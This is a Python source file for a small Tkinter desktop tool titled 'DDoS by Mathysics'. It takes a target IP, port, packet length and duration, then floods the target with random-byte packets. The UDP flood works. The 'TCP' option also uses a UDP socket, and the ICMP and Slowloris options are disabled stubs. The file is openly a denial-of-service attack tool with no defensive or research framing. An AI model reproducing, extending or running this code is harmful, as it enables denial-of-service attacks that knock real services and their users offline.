from tkinter import *
from tkinter import ttk, messagebox
import socket, random, time


'''
    Copyright 2021 Matheus Motta, "Mathysics"
    
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.

'''


root = Tk()

class Funcs:
    def __init__(self):
        self.entry_dur = None
        self.entry_length = None
        self.entry_port = None
        self.entry_ipaddr = None

    def attack(self):
        if self.valdados():
            if self.ta.get() == "TCP":
                self.tcp_attack()
            elif self.ta.get() == "UDP":
                self.udp_attack()
            elif self.ta.get() == "ICMP":
                pass
            elif self.ta.get() == "SLOWLORIS":
                pass

    def valdados(self): # Validação dos campos se vazio, e dos dados inseridos.
        self.variaveis()
        # Validação do campo IP Addr

        if not len(self.ipaddr) == 0:
            try:
                socket.inet_aton(self.ipaddr)
            except socket.error:
                self.showmsg(3, "Invalid IP.")
                return 0
        else:
            self.showmsg(1, "IP Addr field is empty.")
            return 0

        # Validação do campo Port

        if not len(self.port) == 0:
            try:
                if int(self.port) > 65536 or int(self.port) < 1:
                    self.showmsg(1, "Invalid port. (Use 1-65536)")
                    return 0
            except ValueError:
                self.showmsg(1, "Invalid port. (Use 1-65536)")
                return 0
        else:
            self.showmsg(1, "Port field is empty.")
            return 0


        # Validação campo Length

        if not len(self.length) == 0:
            try:
                if int(self.length) > 65515 or int(self.length) < 1:
                    self.showmsg(1, "Invalid packet length. (Use 1-65515)")
                    return 0
            except ValueError:
                self.showmsg(1, "Invalid packet length. (Use 1-65515)")
                return 0
        else:
            self.showmsg(1, "Length field is empty.")
            return 0


        # Validação do campo Duration

        if not len(self.duration) == 0:
            if int(self.duration) < 1:
                self.showmsg(1, "Use the duration of at least 1 second.")
                return 0
        else:
            self.showmsg(1, "Duration field is empty.")
            return 0
        return 1

    def variaveis(self):
        self.ipaddr = self.entry_ipaddr.get()
        self.port = self.entry_port.get()
        self.length = self.entry_length.get()
        self.duration = self.entry_dur.get()
    def showmsg(self,typemsg: int,msg):
        if typemsg == 1:
            messagebox.showinfo("Information", msg)
        elif typemsg == 2:
            messagebox.showwarning("Warning", msg)
        elif typemsg == 3:
            messagebox.showerror("Error", msg)
        else:
            print("Invalid type.")
    def udp_attack(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.counter = 0
        self.varBar.set(0)
        self.inicio = time.time()
        self.timeout = time.time() + int(self.duration)
        while time.time() <= self.timeout:
            self.data = random._urandom(int(self.length))
            self.s.sendto(self.data, (self.ipaddr, int(self.port)))
            self.counter = self.counter + 1
            if time.time() >= self.inicio:
                self.varBar.set(self.varBar.get() + 1)
                self.root.update()
                self.inicio = time.time() + int(self.duration) / 100
        self.showmsg(1, f"{self.ta.get()} Attack on {self.ipaddr}:{self.port} with {self.counter} pkts sended.")
    def tcp_attack(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.counter = 0
        self.varBar.set(0)
        self.inicio = time.time()
        self.timeout = self.inicio + int(self.duration)
        while time.time() <= self.timeout:
            self.data = random._urandom(int(self.length))
            self.s.connect((self.ipaddr, int(self.port)))
            self.s.send(self.data)
            self.counter = self.counter+1
            if time.time() >= self.inicio:
                self.varBar.set(self.varBar.get()+1)
                self.root.update()
                self.inicio=time.time()+int(self.duration)/100
                print(f"{self.varBar.get()} | {self.counter} Pkts")
        self.showmsg(1, f"{self.ta.get()} Attack on {self.ipaddr}:{self.port} with {self.counter} pkts sended.")

class Application(Funcs):
    def __init__(self):
        self.root = root
        self.ta = StringVar()
        self.varBar = DoubleVar()
        self.janela()
        self.frames()
        self.widgets()
        root.mainloop()
    def janela(self):
        self.root.geometry("329x321")
        self.root.title("DDoS - Mathysics")
        self.root.config(bg="#360C0C")
        self.root.resizable(0, 0)
    def frames(self):
        # Frame TARGET
        frame_target = Frame(self.root, bg="#954A4A",bd=2, highlightbackground="#DE5353",highlightthickness=0.1, relief="ridge")
        frame_target.place(relx="0.01", rely="0.23", relwidth="0.98", relheight="0.425")
        self.frame_target = frame_target

        # Frame Options
        frame_options = Frame(self.root, bg="#954A4A",bd=2, highlightbackground="#DE5353",highlightthickness=0.1, relief="ridge")
        frame_options.place(relx="0.01", rely="0.67", relwidth="0.49", relheight="0.32")
        self.frame_options = frame_options

        # Frame Attack
        frame_attack = Frame(self.root, bg="#954A4A",bd=2, highlightbackground="#DE5353",highlightthickness=0.1, relief="ridge")
        frame_attack.place(relx="0.51", rely="0.67", relwidth="0.48", relheight="0.32")
        self.frame_attack = frame_attack

    def widgets(self):
        #----- Titulo do Software
        self.titleprog = Label(self.root, text="DDoS by Mathysics", fg="#C9C9C9", bg="#360C0C", font=("Haettenschweiler",30))
        self.titleprog.place(relx="0.15", rely="0.04",relwidth="0.7", relheight="0.13")

        #---- Widgets do Frame Target


        # Titulo do Frame Target

        self.titleftarget = Label(self.frame_target, text="Target", fg="#C9C9C9", bg="#954A4A", font=("arial",12, "bold"))
        self.titleftarget.place(relx="0.4",rely="0.02")

        # Label e Entry do IPAddr

        self.lb_ipaddr = Label(self.frame_target, text="IP Addr:",bg="#954A4A",fg="black", font=("arial", 10, "bold"))
        self.lb_ipaddr.place(relx="0.01", rely="0.3")
        self.entry_ipaddr = Entry(self.frame_target)
        self.entry_ipaddr.place(relx="0.2", rely="0.3")

        # Label e Entry do Port

        self.lb_port = Label(self.frame_target, text="Port:", bg="#954A4A", fg="black", font=("arial", 10, "bold"))
        self.lb_port.place(relx="0.61", rely="0.3")
        self.entry_port = Entry(self.frame_target, width="10")
        self.entry_port.place(relx="0.75", rely="0.3")

        # Label e Entry do Length

        self.lb_length = Label(self.frame_target, text="Length:", bg="#954A4A", fg="black", font=("arial", 10, "bold"))
        self.lb_length.place(relx="0.01", rely="0.6")
        self.entry_length = Entry(self.frame_target, width="10")
        self.entry_length.place(relx="0.2", rely="0.6")

        # Label e Entry do Duration

        self.lb_dur = Label(self.frame_target, text="Duration:", bg="#954A4A", fg="black", font=("arial", 10, "bold"))
        self.lb_dur.place(relx="0.52", rely="0.6")
        self.entry_dur = Entry(self.frame_target, width="10")
        self.entry_dur.place(relx="0.75", rely="0.6")

        #---- Widgets do Frame Options

        # Titulo do Frame Options

        self.titlefoptions = Label(self.frame_options, text="Options", fg="#C9C9C9", bg="#954A4A",
                                  font=("arial", 12, "bold"))
        self.titlefoptions.place(relx="0.3", rely="0.02")

        self.style = ttk.Style(self.frame_options)
        self.style.configure("TRadiobutton", background="#954A4A",
                        foreground="black", font=("arial", 9, "bold"))

        self.rb_tcp = ttk.Radiobutton(self.frame_options,text="TCP", value="TCP", variable=self.ta)
        self.rb_tcp.place(relx="0.05", rely="0.3")

        self.rb_icmp = ttk.Radiobutton(self.frame_options, text="ICMP", value="ICMP", variable=self.ta)
        self.rb_icmp.configure(state=DISABLED)
        self.rb_icmp.place(relx="0.4", rely="0.3")

        self.rb_udp = ttk.Radiobutton(self.frame_options, text="UDP", value="UDP", variable=self.ta)
        self.rb_udp.place(relx="0.05", rely="0.6")

        self.rb_slowloris = ttk.Radiobutton(self.frame_options, text="SLOWLORIS", value="SLOWLORIS", variable=self.ta)
        self.rb_slowloris.configure(state=DISABLED)
        self.rb_slowloris.place(relx="0.4", rely="0.6")

        # ---- Widgets do Frame Attack

        # Titulo do Frame Attack

        self.titlefattack = Label(self.frame_attack, text="Attack", fg="#C9C9C9", bg="#954A4A",
                                  font=("arial", 12, "bold"))
        self.titlefattack.place(relx="0.32", rely="0.02")

        # Button Attack
        self.btn_startattack = Button(self.frame_attack,text="START",fg="#C9C9C9", bg="#360C0C",
                                      bd="0", width="10", height="1", command=self.attack, font=("arial", 12, "bold"))
        self.btn_startattack.place(relx="0.15", rely="0.3")

        # ProgressBar

        self.pb = ttk.Progressbar(self.frame_attack, variable=self.varBar,maximum=100)
        self.pb.place(relx="0.16", rely="0.65")

if __name__ == "__main__":
    Application()
